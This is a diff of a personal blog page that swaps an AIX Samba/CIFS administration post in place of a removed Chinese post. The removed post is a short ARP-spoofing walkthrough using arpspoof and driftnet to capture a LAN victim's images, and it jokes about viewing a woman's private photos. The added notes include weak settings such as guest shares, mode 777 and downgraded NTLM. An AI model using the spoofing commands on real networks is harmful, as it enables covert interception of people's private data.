@@ -3,27 +3,36 @@
 <head>
   <meta charset="utf-8">
   
-  <title>内网图片获取 | &lt;(￣ c￣)y▂ξ 真煩,來哈根草吧~</title>
+  <title>Samba AIX solutions | &lt;(￣ c￣)y▂ξ 真煩,來哈根草吧~</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="环境搭建12攻击:VMware Fusion--虚拟机Kali Linux受害机:本机 系统: OS X EI Capitan
-攻击条件1Kali Linux必须和OS X 在同一网段内，虚拟机设置请自行Google
-攻击所需工具121.arpspoof2.driftnet
-实验步骤1234567891.获取必要IP地址Kali Linux 使用ifconfig 命令查看本地IP以及网关地址OS">
+  <meta name="description" content="SAMBA:
+——————————————————————————–
+SAMBA CLIENT ALL:
+install SAMBA:
+bos.cifs_fs.5.3.0.0.Ibos.cifs_fs.rte.5.3.0.62.U
+bos.cifs_fs.smit.5.3.0.60.bffsmitty cifs_fs
+lscifsmntrmcifsmnt -f /smb_mntmkcifsmnt">
 <meta property="og:type" content="article">
-<meta property="og:title" content="内网图片获取">
-<meta property="og:url" content="http://0daybug.github.io/2016/02/29/内网图片获取/index.html">
+<meta property="og:title" content="Samba AIX solutions">
+<meta property="og:url" content="http://0daybug.github.io/2016/07/15/Samba-AIX-solutions/index.html">
 <meta property="og:site_name" content="<(￣ c￣)y▂ξ 真煩,來哈根草吧~">
-<meta property="og:description" content="环境搭建12攻击:VMware Fusion--虚拟机Kali Linux受害机:本机 系统: OS X EI Capitan
-攻击条件1Kali Linux必须和OS X 在同一网段内，虚拟机设置请自行Google
-攻击所需工具121.arpspoof2.driftnet
-实验步骤1234567891.获取必要IP地址Kali Linux 使用ifconfig 命令查看本地IP以及网关地址OS">
-<meta property="og:updated_time" content="2016-02-29T09:57:40.000Z">
+<meta property="og:description" content="SAMBA:
+——————————————————————————–
+SAMBA CLIENT ALL:
+install SAMBA:
+bos.cifs_fs.5.3.0.0.Ibos.cifs_fs.rte.5.3.0.62.U
+bos.cifs_fs.smit.5.3.0.60.bffsmitty cifs_fs
+lscifsmntrmcifsmnt -f /smb_mntmkcifsmnt">
+<meta property="og:updated_time" content="2016-07-15T06:09:56.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="内网图片获取">
-<meta name="twitter:description" content="环境搭建12攻击:VMware Fusion--虚拟机Kali Linux受害机:本机 系统: OS X EI Capitan
-攻击条件1Kali Linux必须和OS X 在同一网段内，虚拟机设置请自行Google
-攻击所需工具121.arpspoof2.driftnet
-实验步骤1234567891.获取必要IP地址Kali Linux 使用ifconfig 命令查看本地IP以及网关地址OS">
+<meta name="twitter:title" content="Samba AIX solutions">
+<meta name="twitter:description" content="SAMBA:
+——————————————————————————–
+SAMBA CLIENT ALL:
+install SAMBA:
+bos.cifs_fs.5.3.0.0.Ibos.cifs_fs.rte.5.3.0.62.U
+bos.cifs_fs.smit.5.3.0.60.bffsmitty cifs_fs
+lscifsmntrmcifsmnt -f /smb_mntmkcifsmnt">
   
     <link rel="alternative" href="/atom.xml" title="&lt;(￣ c￣)y▂ξ 真煩,來哈根草吧~" type="application/atom+xml">
   
@@ -225,11 +234,11 @@
         </header>                
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-内网图片获取" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-Samba-AIX-solutions" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2016/02/29/内网图片获取/" class="article-date">
-      <time datetime="2016-02-29T09:25:27.000Z" itemprop="datePublished">2016-02-29</time>
+      <a href="/2016/07/15/Samba-AIX-solutions/" class="article-date">
+      <time datetime="2016-07-15T05:59:55.000Z" itemprop="datePublished">2016-07-15</time>
 </a>
     </div>
   
@@ -242,7 +251,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      内网图片获取
+      Samba AIX solutions
     </h1>
   
 
@@ -253,7 +262,7 @@
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/渗透测试/">渗透测试</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/AIX/">AIX</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -263,12 +272,111 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">攻击:VMware Fusion--虚拟机Kali Linux</span><br><span class="line">受害机:本机 系统: OS X EI Capitan</span><br></pre></td></tr></table></figure>
-<h3 id="攻击条件"><a href="#攻击条件" class="headerlink" title="攻击条件"></a>攻击条件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Kali Linux必须和OS X 在同一网段内，虚拟机设置请自行Google</span><br></pre></td></tr></table></figure>
-<h3 id="攻击所需工具"><a href="#攻击所需工具" class="headerlink" title="攻击所需工具"></a>攻击所需工具</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.arpspoof</span><br><span class="line"><span class="number">2</span>.driftnet</span><br></pre></td></tr></table></figure>
-<h3 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.获取必要IP地址</span><br><span class="line">Kali Linux 使用ifconfig 命令查看本地IP以及网关地址</span><br><span class="line">OS X 地址</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>.使用Arpspoof -i eth0 -t <span class="number">192.168</span>.<span class="number">1.1</span> <span class="number">192.168</span>.<span class="number">1.111</span></span><br><span class="line">这边解释一下,eth0为Kali Linux本地网卡设备,<span class="number">192.168</span>.<span class="number">1.1</span>为我的网关地址, <span class="number">192.168</span>.<span class="number">1.111</span> 为OS X（受害者地址）</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>.driftnet -i eth0 用来获取受害者图片</span><br><span class="line">这条命令执行完成后会弹出窗口，如果那时候受害者正在浏览图片，那么这个窗口就会显示相应图片，这样子 如果一个妹子和你正在同一个局域网内，而恰好她正在浏览自己的私密相册，那么嘿嘿嘿...至于嘿嘿嘿是什么我就不细说了，zzz</span><br></pre></td></tr></table></figure>
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这个测试还是可以自己动手玩玩的，其实其中的原理也相当简单，就是简单的ARP欺骗，但是还是挺好用的zz...</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="http://weibo.com/styhunger" target="_blank" rel="external">Weibo</a></p>
+        <p>SAMBA:</p>
+<h2 id="——————————————————————————–"><a href="#——————————————————————————–" class="headerlink" title="——————————————————————————–"></a>——————————————————————————–</h2><hr>
+<p>SAMBA CLIENT ALL:</p>
+<p>install SAMBA:</p>
+<p>bos.cifs_fs.5.3.0.0.I<br>bos.cifs_fs.rte.5.3.0.62.U</p>
+<h2 id="bos-cifs-fs-smit-5-3-0-60-bff"><a href="#bos-cifs-fs-smit-5-3-0-60-bff" class="headerlink" title="bos.cifs_fs.smit.5.3.0.60.bff"></a>bos.cifs_fs.smit.5.3.0.60.bff</h2><p>smitty cifs_fs</p>
+<p>lscifsmnt<br>rmcifsmnt -f /smb_mnt<br>mkcifsmnt -f /mnt -d share1 -h server1 -c user1</p>
+<hr>
+<p>smitty cifs_fs:<br>first it will do in read-only, later have to come back again and set it again<br>If Share name is like this: \server name\share name, it is enough to write “share name” (\server.. not needed)</p>
+<pre><code>[Entry Fields]
+</code></pre><ul>
+<li>Pathname of mount point                             /homes/ftp/Test<br>SERVER name                                        [10.10.40.10]<br>User Name                                          [SSH01]<br>Password                                           []<br>Share name                                         [Test]        &lt;–what has been shared on the other system<br>Mount as a READ-ONLY system                        [no]          &lt;–first it will be read-only, come back again                                                                                                        +<br>uid                                                [6027083]<br>gid                                                [6000116]<br>Mode                                               [777]<br>Domain to Authenticate against                     []            &lt;–once on windows I had to set here: ads<br>Remount now, add change to /etc/filesystems,       [Both]<pre><code>or both
+</code></pre>/etc/filesystems entry will mount on start         [no]<br>Mount Type name                                    []</li>
+</ul>
+<p>After these the credential file has to be set as well:<br>smitty cifs_fs -&gt; Credential configuration</p>
+<p>/etc/cifs_fs/cifscred file      allows future mounting of CIFS shares with stored credentials<br>lscifscred                lists the server or user entries stored in the /etc/cifs_fs/cifscred file (mkcifscred, rmcifscred, chcifscred)</p>
+<hr>
+<p>other methods:<br>/usr/sbin/mkcifsmnt -t rw -f /homes/ftp/29/test -d test -h 10.10.15.24 -c SSG01 -p xyz -u 32292 -g 6000116 -x 777<br>mount -v cifs -n 10.10.15.24/SSG01/xyz -o uid=32292,gid=200,fmode=775 test /homes/ftp/29/test</p>
+<hr>
+<p>Once on Win side had to change something in order to work:<br>“I have changed something on the server - from “Send NTLMv2 response only. Refuse LM  NTLM” to “ Send LM &amp; NTLM - use NTLMv2 session security if negotiated” So I hope, this fixes the problem”</p>
+<h2 id="——————————————————————————–-1"><a href="#——————————————————————————–-1" class="headerlink" title="——————————————————————————–"></a>——————————————————————————–</h2><hr>
+<h2 id="——————————————————————————–-2"><a href="#——————————————————————————–-2" class="headerlink" title="——————————————————————————–"></a>——————————————————————————–</h2><hr>
+<p>SAMBA SERVER ALL:</p>
+<p>Needed ports:</p>
+<p>netbios-ns        137/tcp           # NETBIOS Name Service<br>netbios-ns        137/udp           # NETBIOS Name Service<br>netbios-dgm       138/tcp           # NETBIOS Datagram Service<br>netbios-dgm       138/udp           # NETBIOS Datagram Service<br>netbios-ssn       139/tcp           # NETBIOS Session Service<br>netbios-ssn       139/udp           # NETBIOS Session Service</p>
+<p>microsoft-ds      445/tcp           # Microsoft-DS<br>microsoft-ds      445/udp           # Microsoft-DS</p>
+<p>netbios is Windows file &amp; printer sharing</p>
+<p>Microsoft-DS (Microsoft Directory Services) is a port used for file sharing. It was introduced with Windows 2000 and gives you the possibility to use SMB protocol (stands for Server Message Block, but is also known as Samba) directly over TCP-IP on port 445.</p>
+<p>In www.samba.org, written this:<br>UDP/137    - used by nmbd<br>UDP/138    - used by nmbd<br>TCP/139    - used by smbd<br>TCP/445    - used by smbd</p>
+<p>INSTALL:</p>
+<p>/mnt/MISC/SAMBA<br>-rwxrwxrwx   1 root     sys        67379200 Jun 28 2005  samba-3.0.4.0.bff</p>
+<p>smitty install:<br>root@aix31: /mnt/MISC/SAMBA # lslpp -l | grep -i samba<br>  freeware.samba.rte         3.0.4.0  COMMITTED  Samba Version 3.0.4</p>
+<hr>
+<p>SWAT (SAMBA Web Administartion Tool) configuration: (not necessary, only if you want it)<br>It is a GUI for SAMBA, a web browser is needed for SWAT, and X11 as well.</p>
+<p>/etc/services:<br>swat    901/tcp</p>
+<p>/etc/inetd.conf:<br>swat    stream  tcp     nowait  root    /usr/local/samba/sbin/swat      swat</p>
+<p>in browser:</p>
+<h2 id="http-localhost-901"><a href="#http-localhost-901" class="headerlink" title="http://localhost:901"></a><a href="http://localhost:901" target="_blank" rel="external">http://localhost:901</a></h2><p>SAMBA tools:</p>
+<p>install dir: /usr/local/samba</p>
+<p>/usr/local/samba/sbin/nmbd                &lt;–provides netbios nameserver supports to clients (nameserver for samba)<br>/usr/local/samba/sbin/smbd                &lt;–smb daemon<br>/usr/local/samba/sbin/smbd -b             &lt;–shows configuration infos. i.e.: path for the config file: smbd -b|grep smb.conf<br>/usr/local/samba/bin/smbstatus            &lt;–shows actual sharings and connections<br>/usr/local/samba/bin/testparm             &lt;–test the smb.conf file for any typo<br>/usr/local/samba/bin/pdbedit -a user123   &lt;–creates users (on AIX I created before)<br>/usr/local/samba/bin/smbpasswd            &lt;–changes pw (-a: add a user who can access the shares from a client)<br>/usr/local/samba/bin/smbclient            &lt;–it is an SMB client program for UNIX machines, it provides an ftp like interface,</p>
+<pre><code>to transfer files between a windows &apos;server&apos; and a unix &apos;client&apos;
+</code></pre><hr>
+<p>PROCESS OF SAMBA CONFIGURATION:</p>
+<ol>
+<li><p>check ports: a 137,138,139,445 (if needed firewall opening)<br>rpcinfo, telnet</p>
+</li>
+<li><p>check where is smb.conf:<br>/usr/local/samba/sbin/smbd -b               &lt;–shows version of SAMBA etc.,and the path to smb.conf</p>
+</li>
+<li><p>edit smb.conf:<br>/usr/local/samba/lib/smb.conf (it is a link to /etc/samba/smb.conf)</p>
+</li>
+</ol>
+<p>Create a similar entry:</p>
+<p>[samba_share]                               &lt;–use this name for connection<br>        comment = share test                &lt;–anything can be written here<br>        path = /home/samba_share            &lt;–path of the dir what we want to share<br>        read only = no<br>        guest ok = yes<br>        read list = user123                 &lt;–users who will be able to read it (space separated)<br>        write list = user123                &lt;–users who will be able to write to it (space separated)</p>
+<p>Important:<br>-check owner,rights of the given directory (in the path)<br>-after chacnging the conf file, daemons have to be restarted in order changes be refreshed</p>
+<hr>
+<p>this is good for read only:<br>[samba_share]<br>   comment = share test<br>   path = /home/samba_share<br>   read only = no</p>
+<h2 id="guest-ok-yes"><a href="#guest-ok-yes" class="headerlink" title="   guest ok = yes"></a>   guest ok = yes</h2><p>3.SAMBA user creation:<br>/usr/local/samba/bin/smbpasswd -a user123                  &lt;– -a: add user as well</p>
+<p>Same user has to be created, to what we gave in the conf file</p>
+<p>For root we can create one:<br>/usr/local/samba/bin/smbpasswd -a root<br>(root passw is needed)</p>
+<ol>
+<li>testing smb.conf:<br>/usr/local/samba/bin/testparm                              &lt;–test the smb.conf file for any typo (default conf file)</li>
+</ol>
+<p>testing not the default conf file:<br>/usr/local/samba/bin/testparm /etc/samba/smb.conf</p>
+<ol>
+<li><p>starting daemons:<br>/usr/local/samba/sbin/smbd -D                              &lt;– -D: handling it as daemon (this is the default)<br>/usr/local/samba/sbin/nmbd -D</p>
+</li>
+<li><p>connecting to SAMBA:</p>
+</li>
+</ol>
+<p>LOCALLY (AIX):<br>/usr/local/samba/bin/smbclient //localhost/samba_share     &lt;–samba_share: which has been created in conf file</p>
+<p>password is what has been created with smbpasswd for the user<br>if not root user, than check permissions of the conf file (if needed give read permission)</p>
+<p>another way: /usr/local/samba/bin/smbclient -U% -L localhost</p>
+<p>REMOTELY (WINDOWS):<br>(tools-&gt;map network drive-&gt;choose a drive)<br>the command: \10.10.101.78\samba_share                    &lt;–it will map that directory</p>
+<p>“Connect using a different username”: If on Windows and AIX users are identical this is not needed.<br>If user/pw created in SAMBA is different of the actual windows user/pw, then here we can give the SAMBA user/pw.</p>
+<ol>
+<li>Checks, tests:<br>/usr/local/samba/bin/smbstatus                             &lt;–shows connections (if we could connect)</li>
+</ol>
+<p>/usr/local/samba/bin/smbclient -L 10.10.101.78             &lt;–shows which shares are available on a given host</p>
+<p>!!!2 different SAMBA version (rpm and a fileset one) should no be installed at the same time (daemons did not started for me)!!!!</p>
+<h2 id="——————————————————————————–-3"><a href="#——————————————————————————–-3" class="headerlink" title="——————————————————————————–"></a>——————————————————————————–</h2><hr>
+<p>I had this error:<br>(Samba was installed from rpm and it was started from inetd.)</p>
+<h1 id="smbclient-L-localhost-U"><a href="#smbclient-L-localhost-U" class="headerlink" title="smbclient -L localhost -U "></a>smbclient -L localhost -U <user></user></h1><p>added interface ip=10.10.10.8 bcast=10.10.35.31 nmask=255.255.255.224<br>session request to LOCALHOST failed (Call returned zero bytes (EOF)<br>)<br>session request to *SMBSERVER failed (Call returned zero bytes (EOF)<br>)</p>
+<ol>
+<li><p>check samba logs (I turned this on)<br>vi /etc/inetd.conf: netbios-ssn stream tcp nowait root /usr/sbin/smbd -l /var/log/samba.log smbd<br>refresh -s inetd<br>(probably in syslog you can find where it is logging)</p>
+</li>
+<li><p>cat samba.log<br>…<br>[2012/10/11 09:20:11, 0] tdb/tdbutil.c:tdb_log(531)<br>tdb(/etc/secrets.tdb): rec_free_read bad magic 0x2f73616d at offset=812    &lt;–shows problems with /etc/secrets.tdb<br>[2012/10/11 09:20:11, 0] passdb/machine_sid.c:pdb_generate_sam_sid(163)<br>pdb_generate_sam_sid: Failed to store generated machine SID.<br>[2012/10/11 09:20:11, 0] smbd/server.c:main(793)<br>ERROR: Samba cannot create a SAM SID.</p>
+</li>
+<li><p>stop samba<br>vi /etc/inetd.conf -&gt; comment lines smbd, nmbd<br>refresh -s inetd</p>
+</li>
+<li><p>remove /etc/secrets.tdb<br>mv /etc/secrets.tdb /etc/secrets.tdb.old</p>
+</li>
+<li><p>start samba<br>vi /etc/inetd.conf -&gt; uncomment smbd, nmbd lines<br>refresh -s inetd</p>
+</li>
+<li><p>test login</p>
+<h1 id="smbclient-L-localhost-U-1"><a href="#smbclient-L-localhost-U-1" class="headerlink" title="smbclient -L localhost -U "></a>smbclient -L localhost -U <user></user></h1><p>added interface ip=10.10.10.8 bcast=10.10.35.31 nmask=255.255.255.224<br>Password:</p>
+</li>
+</ol>
+<hr>
+<p>I had this “error”:</p>
+<h1 id="smbstatus"><a href="#smbstatus" class="headerlink" title="smbstatus"></a>smbstatus</h1><p>Samba version 2.2.7</p>
+<h2 id="Service-uid-gid-pid-machine"><a href="#Service-uid-gid-pid-machine" class="headerlink" title="Service      uid      gid      pid     machine"></a>Service      uid      gid      pid     machine</h2><p>Failed to open byte range locking database<br>ERROR: Failed to initialise locking database<br>Can’t initialise locking module - exiting</p>
+<p>This is not an error after first successful login it will be OK.<br>I did: smbclient -L localhost -U <user><br>After that: smbstatus</user></p>
+<p>Samba version 2.2.7</p>
+<h2 id="Service-uid-gid-pid-machine-1"><a href="#Service-uid-gid-pid-machine-1" class="headerlink" title="Service      uid      gid      pid     machine"></a>Service      uid      gid      pid     machine</h2><p>No locked files</p>
+<hr>
 
       
     </div>
@@ -277,13 +385,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2016/02/29/内网图片获取/">内网图片获取</a></p>
+        <p><span>本文标题:</span><a href="/2016/07/15/Samba-AIX-solutions/">Samba AIX solutions</a></p>
         <p><span>文章作者:</span><a href="/" title="访问 Dylan Kios 的个人博客">Dylan Kios</a></p>
-        <p><span>发布时间:</span>2016年02月29日 - 17时25分</p>
-        <p><span>最后更新:</span>2016年02月29日 - 17时57分</p>
+        <p><span>发布时间:</span>2016年07月15日 - 13时59分</p>
+        <p><span>最后更新:</span>2016年07月15日 - 14时09分</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2016/02/29/内网图片获取/" title="内网图片获取">http://0daybug.github.io/2016/02/29/内网图片获取/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://0daybug.github.io/2016/02/29/内网图片获取/　　作者: Dylan Kios" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2016/07/15/Samba-AIX-solutions/" title="Samba AIX solutions">http://0daybug.github.io/2016/07/15/Samba-AIX-solutions/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://0daybug.github.io/2016/07/15/Samba-AIX-solutions/　　作者: Dylan Kios" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script src="/js/clipboard.min.js"></script>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
@@ -297,15 +405,15 @@
     <nav id="article-nav">
         
             <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2016/03/16/hello-world/">
-                    Hello World
+                <a href="/2016/07/20/SocketProgram/">
+                    SocketProgram
                 </a>
             </div>
         
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2016/02/28/渗透测试流程/">
-                    渗透测试流程
+                <a href="/2016/07/06/IBM-AIX-6-install-Openssh-7-2p2/">
+                    IBM AIX 6 install Openssh 7.2p2
                 </a>
             </div>
         
@@ -316,7 +424,7 @@
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
-    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#环境搭建"><span class="toc-number">1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#攻击条件"><span class="toc-number">2.</span> <span class="toc-text">攻击条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#攻击所需工具"><span class="toc-number">3.</span> <span class="toc-text">攻击所需工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#实验步骤"><span class="toc-number">4.</span> <span class="toc-text">实验步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#总结"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#——————————————————————————–"><span class="toc-number">1.</span> <span class="toc-text">——————————————————————————–</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bos-cifs-fs-smit-5-3-0-60-bff"><span class="toc-number">2.</span> <span class="toc-text">bos.cifs_fs.smit.5.3.0.60.bff</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#——————————————————————————–-1"><span class="toc-number">3.</span> <span class="toc-text">——————————————————————————–</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#——————————————————————————–-2"><span class="toc-number">4.</span> <span class="toc-text">——————————————————————————–</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#http-localhost-901"><span class="toc-number">5.</span> <span class="toc-text">http://localhost:901</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#guest-ok-yes"><span class="toc-number">6.</span> <span class="toc-text">   guest ok = yes</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#——————————————————————————–-3"><span class="toc-number">7.</span> <span class="toc-text">——————————————————————————–</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#smbclient-L-localhost-U"><span class="toc-number"></span> <span class="toc-text">smbclient -L localhost -U </span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#smbclient-L-localhost-U-1"><span class="toc-number"></span> <span class="toc-text">smbclient -L localhost -U </span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#smbstatus"><span class="toc-number"></span> <span class="toc-text">smbstatus</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Service-uid-gid-pid-machine"><span class="toc-number">1.</span> <span class="toc-text">Service      uid      gid      pid     machine</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Service-uid-gid-pid-machine-1"><span class="toc-number">2.</span> <span class="toc-text">Service      uid      gid      pid     machine</span></a></li></ol>
 </div>
 <style>
     .left-col .switch-btn {
@@ -380,7 +488,7 @@
   
   <div class="duoshuo" id="comments">
     <!-- 多说评论框 start -->
-    <div class="ds-thread" data-thread-key="内网图片获取" data-title="内网图片获取" data-url="http://0daybug.github.io/2016/02/29/内网图片获取/"></div>
+    <div class="ds-thread" data-thread-key="Samba-AIX-solutions" data-title="Samba AIX solutions" data-url="http://0daybug.github.io/2016/07/15/Samba-AIX-solutions/"></div>
     <!-- 多说评论框 end -->
     <!-- 多说公共JS代码 start (一个网页只需插入一次) -->
     <script type="text/javascript">
@@ -404,7 +512,7 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2016/03/16/hello-world/" title="上一篇: Hello World">
+            <a href="/2016/07/20/SocketProgram/" title="上一篇: SocketProgram">
                 <i class="fa fa-angle-left"></i>
             </a>
         
@@ -412,7 +520,7 @@
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2016/02/28/渗透测试流程/" title="下一篇: 渗透测试流程">
+            <a href="/2016/07/06/IBM-AIX-6-install-Openssh-7-2p2/" title="下一篇: IBM AIX 6 install Openssh 7.2p2">
                 <i class="fa fa-angle-right"></i>
             </a>
         
